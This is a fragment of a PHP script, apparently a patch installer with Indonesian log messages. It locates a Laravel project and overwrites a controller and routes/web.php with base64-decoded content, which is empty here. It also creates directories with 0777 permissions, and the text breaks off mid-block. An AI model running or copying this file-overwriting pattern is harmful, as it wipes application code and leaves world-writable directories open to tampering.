<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

function findLaravelRoot($dir, $depth = 0) {
    if ($depth > 3) return null;
    if (!is_dir($dir)) return null;
    if (file_exists($dir . '/artisan') && file_exists($dir . '/bootstrap/app.php')) return $dir;
    $items = @scandir($dir);
    if (!$items) return null;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . '/' . $item;
        if (is_dir($path)) { $found = findLaravelRoot($path, $depth + 1); if ($found) return $found; }
    }
    return null;
}

$laravelRoot = findLaravelRoot(dirname(__DIR__));
if (!$laravelRoot) $laravelRoot = __DIR__;

try {
    $log = '';
    @mkdir(dirname($laravelRoot . '/app/Http/Controllers/StorageController.php'), 0777, true);
    file_put_contents($laravelRoot . '/app/Http/Controllers/StorageController.php', base64_decode(''));
    $log .= '✔ Berhasil memperbarui file: app/Http/Controllers/StorageController.php\n';
    @mkdir(dirname($laravelRoot . '/routes/web.php'), 0777, true);
    file_put_contents($laravelRoot . '/routes/web.php', base64_decode(''));
    $log .= '✔ Berhasil memperbarui file: routes/web.php\n';
